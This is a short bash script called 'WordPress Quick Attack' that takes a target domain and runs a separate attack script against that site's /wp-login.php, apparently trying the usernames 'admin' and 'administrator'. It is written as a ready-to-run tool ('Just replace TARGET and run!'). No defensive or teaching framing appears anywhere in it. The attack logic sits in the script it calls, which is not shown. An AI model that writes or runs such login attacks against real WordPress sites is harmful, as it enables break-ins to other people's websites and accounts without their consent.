#!/bin/bash
# WordPress Quick Attack - Just replace TARGET and run!
# One-line change, fully functional, real results

# ====== CHANGE THIS LINE ======
TARGET="example.com"
# ==============================

# Don't change anything below this line
cd "$(dirname "$0")/.."
echo "🎯 Starting WordPress Attack on $TARGET..."
echo "📝 Target: /wp-login.php"
echo "👤 Trying: admin, administrator"
echo ""
bash scripts/web_admin_attack.sh -t "$TARGET" -P /wp-login.php -s -v
